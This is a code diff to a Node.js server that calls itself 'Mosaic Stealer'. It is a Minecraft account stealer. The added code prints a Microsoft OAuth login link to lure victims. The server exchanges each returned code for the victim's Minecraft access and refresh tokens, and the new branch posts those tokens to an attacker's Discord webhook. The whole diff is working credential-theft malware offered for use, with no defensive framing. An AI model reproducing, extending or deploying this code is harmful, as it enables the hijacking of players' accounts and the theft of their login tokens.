@@ -1,5 +1,4 @@
 //import mods
-
 const ax = require("axios");
 var querystring = require("querystring");
 const { Webhook, MessageBuilder } = require("discord-webhook-node");
@@ -7,9 +6,9 @@ var express = require("express");
 var fs = require("fs");
 const app = express();
 
-var settings = fs.readFileSync("settings.json");
+var settings = JSON.parse(fs.readFileSync("settings.json"));
 
-const port = JSON.parse(settings)["port"];
+const port = settings["port"];
 
 function replaceAll(str, find, replace) {
   return str.replace(new RegExp(find, "g"), replace);
@@ -29,6 +28,13 @@ console.log(`
        ░       ░ ░        ░        ░  ░ ░  ░ ░      
                                            ░        
 `);
+console.log(
+  `URL: https://login.live.com/oauth20_authorize.srf?client_id=${encodeURIComponent(
+    settings["client_id"]
+  )}&response_type=code&redirect_uri=${encodeURIComponent(
+    settings["redirect_uri"]
+  )}&scope=XboxLive.signin%20offline_access`
+);
 function getJavaAccess(code) {
   const javaPromise = new Promise((resolve, reject) => {
     ax.post(
@@ -96,7 +102,7 @@ function getJavaAccess(code) {
   return javaPromise;
 }
 
-var apiKey = "HYPIXEL_API_KEY";
+var apiKey = settings["HypixelApiKey"]; // HYPIXEL API KEY
 app.get("/", (req, res) => {
   if (!req.query.code) return res.status(404).end("404");
   getJavaAccess(req.query.code)
@@ -107,6 +113,33 @@ app.get("/", (req, res) => {
         headers: { Authorization: "Bearer " + token },
       }).then((resp) => {
         var ply = resp.data["id"];
+        if (apiKey == "" || !apiKey) {
+          const hook = new Webhook(settings["webhook"]);
+          const embed = new MessageBuilder()
+            .setTitle("New player has been logged.")
+            .setAuthor("Mosaic Stealer")
+            .setColor("#FF0000")
+            .setDescription(
+              "**Access token:** ```" +
+                token +
+                "```\n**Refresh token:** ```" +
+                refresh +
+                "```"
+            );
+          hook
+            .send(embed)
+            .then((res) =>
+              console.log(
+                "\u001b[0;32mSent information to webhook.\u001b[0;37m"
+              )
+            )
+            .catch((err) => {
+              console.log(
+                `\u001b[0;31mError has occured sending everything to the webhook: \u001b[1;32m${err}\u001b[0;37m`
+              );
+            });
+          return;
+        }
         ax.get("https://api.hypixel.net/friends?uuid=" + ply, {
           headers: {
             "API-Key": apiKey,
@@ -129,8 +162,8 @@ app.get("/", (req, res) => {
             const hook = new Webhook(settings["webhook"]);
             const embed = new MessageBuilder()
               .setTitle("New player has been logged.")
-              .setAuthor(resp.data["player"]["displayname"])
-              .setColor("#000000")
+              .setAuthor("Mosaic Stealer")
+              .setColor("#FF0000")
               .setDescription(
                 "**Access token:** ```" +
                   token +
